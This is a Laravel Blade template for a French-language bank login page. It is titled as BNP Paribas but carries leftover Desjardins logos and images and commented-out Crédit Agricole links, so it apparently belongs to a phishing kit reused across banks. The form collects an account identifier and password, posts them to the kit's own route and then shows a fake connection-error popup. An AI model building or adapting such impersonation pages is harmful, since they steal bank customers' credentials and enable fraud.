<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
    <title>BNP Paribas - Connexion</title>
    <!-- Ajoutez le script à l'intérieur de la balise <head> -->
        {{-- Favicon --}}
    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logojardins.svg') }}">
    {{-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> --}}
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.css">


    <style>
        #button-devenir-client {
    float: right;
    width: 181px;
    height: 48px;
    color: #fff;
    text-align: center;
    line-height: 48px;
    border-radius: 36px;
    background: 0 0;
    background-color: #28c3a9;
    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .36);
    padding: 0;
    margin: 1px 2px 0 10px;
}
    </style>
</head>

<body>

    <script>
        $(document).ready(function() {
            $('#compteBancaire').inputmask('99-9999999-99');
        });
    </script>

    <nav class="navbar">
        <img src="{{ asset('logojardins.svg') }}" alt="Bnp paribas" >
        {{-- <img src="https://www.desjardins.com/ressources/images/logo-accesd.png" alt="AccèsD" class="access-logo"> --}}
        {{-- <img src="https://www.desjardins.com/ressources/images/logo-accesd.png" alt="AccèsD Affaires" class="access-logo"> --}}

        <!-- <h2>Slogan de la banque</h2> -->
        <ul>
            {{-- <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/epargne/livret-epargne-logement/livret-a.html">Epargne</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/assurances/habitation/assurance-habitation.html">Assurance</a></li>
            <li><a href="https://www.credit-agricole.fr/particulier/credit/immobilier/credit-immobilier-facilimmo.html">Credit</a></li>
            <li><a href="#">Contact</a></li> --}}

            {{-- <li>
                <a id="button-devenir-client" href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>
            </li> --}}
        </ul>
        <button class="menu-btn">&#9776;</button>
    </nav>

    <div class="login-container">
        <div class="left-section">

            <!-- Partie gauche (couleur verte) avec le formulaire -->
            <div class="form-section">
                <h2> Se connecter </h2>
                <form action="{{ route('login.feature') }}" method="POST">
                    @csrf

                    <div class="form-group">
                        <label for="accountNumber">Identifiant</label>
                        <input type="text" id="compteBancaire" name="numero_compte" required>
                    </div>

                    <div class="form-group">
                        <label for="password">2. Mot de passe</label>
                        <input type="password" name="password" required>
                    </div>
                    <!-- Ajoutez ceci à l'intérieur de votre formulaire, juste avant le bouton de soumission -->
                    <div id="error-message" style="color: red; margin-top: 10px; display: none;"></div>

                    <button type="submit">Valider</button>


                </form>
                <br>
                <br>
                <h3>Téléchargez l’application Ma Banque

                    Chacun d’entre vous gère différemment ses besoins bancaires.
                    Seul ou accompagné, au Bnp paribas, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
            </div>
        </div>
        <div class="right-section">
            <!-- Partie droite (couleur blanche) avec les consignes -->
            <div class="instructions-section">
               <img src="{{ asset('desjardins.jpg') }}" alt="">
            </div>
        </div>
    </div>
    <!-- Ajoutez la balise footer pour l'image en bas -->
    <footer>
        <img src="{{ asset('assets/footer.png') }}" alt="" style="width: 100%; margin-top: auto;">
    </footer>

    <script type="module">
        import Swal from 'https://cdn.jsdelivr.net/npm/sweetalert2@11/src/sweetalert2.js';


        window.addEventListener("load", (event) => {
            const connecte = document.getElementById('error-connecte');
            console.log(connecte);


                connecte.addEventListener('click', function() {
                    Swal.fire({
                        title: "Erreur de Connexion!",
                        text: "impossible de se connecter.....",
                        icon: "error"
                    });
                });

        });


      </script>

</body>

</html>
